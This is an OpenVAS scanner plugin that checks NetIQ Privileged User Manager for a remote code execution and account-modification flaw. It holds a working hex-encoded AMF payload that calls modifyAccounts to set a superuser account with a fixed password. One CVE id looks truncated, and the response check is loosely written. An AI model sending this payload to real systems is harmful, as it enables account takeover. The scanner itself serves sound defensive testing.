###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novell_netiq_privileged_user_manager_rce_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Novell NetIQ Privileged User Manager Remote Code Execution Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute perl code and
  change administrative credentials.
  Impact Level: System/Application";
tag_affected = "Novell NetIQ Privileged User Manager 2.3.0 and 2.3.1";
tag_insight = "The flaws are due to an error in the 'ldapagnt' and 'auth' module due to not
  restricting access to certain methods, which can be exploited to execute
  perl code by passing arbitrary arguments to the Perl 'eval()' function
  via HTTP POST requests and attacker can change administrative credentials
  using the 'modifyAccounts()' function via HTTP POST requests.";
tag_solution = "Apply NetIQ Privileged User Manager 2.3.1 HF2 (2.3.1-2) or later,
  http://download.novell.com/protected/Summary.jsp?buildid=K6-PmbPjduA~";
tag_summary = "The host is running Novell NetIQ Privileged User Manager and
  is prone to remote code execution vulnerability.";

if(description)
{
  script_id(802043);
  script_version("$Revision: 12 $");
  script_bugtraq_id(56535, 56539);
  script_cve_id("CVE-2012-5930", "CVE-2012-5931", "CVE-2012-593");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-11-21 18:46:53 +0530 (Wed, 21 Nov 2012)");
  script_name("Novell NetIQ Privileged User Manager Remote Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51291");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22737");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118117");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118118");
  script_xref(name : "URL" , value : "https://www.netiq.com/support/kb/doc.php?id=7011385");
  script_xref(name : "URL" , value : "http://retrogod.altervista.org/9sg_novell_netiq_ii.htm");
  script_xref(name : "URL" , value : "http://retrogod.altervista.org/9sg_novell_netiq_ldapagnt_adv.htm");

  script_description(desc);
  script_summary("Check Novell NetIQ Privileged User Manager is vulnerable to RCE");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports(443);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("openvas-https.inc");

port = 0;
req1 = "";
res1 = "";
req2 = "";
res2 = "";
post_data = "";


## Default HTTPS port
port = get_http_port(default:443);
if(!port){
  port = 443;
}

## Check Port State
if(!get_port_state(port)) exit(0);

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Initial request
req1 = http_get(item:"/", port:port);
res1 = https_req_get(port:port, request:req1);

## Confirm the application before trying the exploit
if(">NetIQ Privileged User Manager<" >< res1)
{
  ## Post data
  post_data = '\x00\x00\x00\x00\x00\x01\x00\x13\x53\x50\x46\x2e\x55\x74\x69\x6c' +
              '\x2e\x63\x61\x6c\x6c\x4d\x61\x73\x74\x65\x72\x00\x04\x2f\x32\x36' +
              '\x32\x00\x00\x02\x98\x0a\x00\x00\x00\x01\x03\x00\x06\x6d\x65\x74' +
              '\x68\x6f\x64\x02\x00\x0e\x6d\x6f\x64\x69\x66\x79\x41\x63\x63\x6f' +
              '\x75\x6e\x74\x73\x00\x06\x6d\x6f\x64\x75\x6c\x65\x02\x00\x04\x61' +
              '\x75\x74\x68\x00\x04\x55\x73\x65\x72\x03\x00\x04\x6e\x61\x6d\x65' +
              '\x02\x00\x05\x6f\x76\x78\x79\x7a\x00\x09\x41\x43\x54\x5f\x53\x55' +
              '\x50\x45\x52\x03\x00\x05\x76\x61\x6c\x75\x65\x00\x3f\xf0\x00\x00' +
              '\x00\x00\x00\x00\x00\x06\x61\x63\x74\x69\x6f\x6e\x02\x00\x03\x73' +
              '\x65\x74\x00\x00\x09\x00\x0b\x41\x43\x54\x5f\x43\x4f\x4d\x4d\x45' +
              '\x4e\x54\x03\x00\x05\x76\x61\x6c\x75\x65\x02\x00\x04\x61\x73\x64' +
              '\x64\x00\x06\x61\x63\x74\x69\x6f\x6e\x02\x00\x03\x73\x65\x74\x00' +
              '\x00\x09\x00\x0a\x41\x43\x54\x5f\x50\x41\x53\x53\x57\x44\x03\x00' +
              '\x05\x76\x61\x6c\x75\x65\x02\x00\x05\x6f\x76\x74\x6d\x70\x00\x06' +
              '\x61\x63\x74\x69\x6f\x6e\x02\x00\x03\x73\x65\x74\x00\x00\x09\x00' +
              '\x08\x41\x43\x54\x5f\x44\x45\x53\x43\x03\x00\x05\x76\x61\x6c\x75' +
              '\x65\x02\x00\x03\x73\x64\x73\x00\x06\x61\x63\x74\x69\x6f\x6e\x02' +
              '\x00\x03\x73\x65\x74\x00\x00\x09\x00\x00\x09\x00\x03\x75\x69\x64' +
              '\x06\x00\x00\x09';

  ## Construct the POST request
  req2 = string("POST ", "/", " HTTP/1.1\r\n",
                "User-Agent: OpenVAS RCE Agent\r\n",
                "Host: ", host, "\r\n",
                "Accept: */*\r\n",
                "Cookie: _SID_=1;\r\n",
                "Content-Type: application/x-amf\r\n",
                "x-flash-version: 11,4,402,278\r\n",
                "Content-Length: ", strlen(post_data), "\r\n",
                "\r\n", post_data);

  ## Receive the response
  res2 = https_req_get(port:port, request:req2);

  ## Check Attack pattern in the response
  if('onResult\x00\x04null' >< res2 && 'Error\x00\x04code' >!< res2 &&
     ('You are not authorized to perform this operation' >!< res2 ||
      'No module available' >!<  res2)){
    security_hole(port);
  }
}
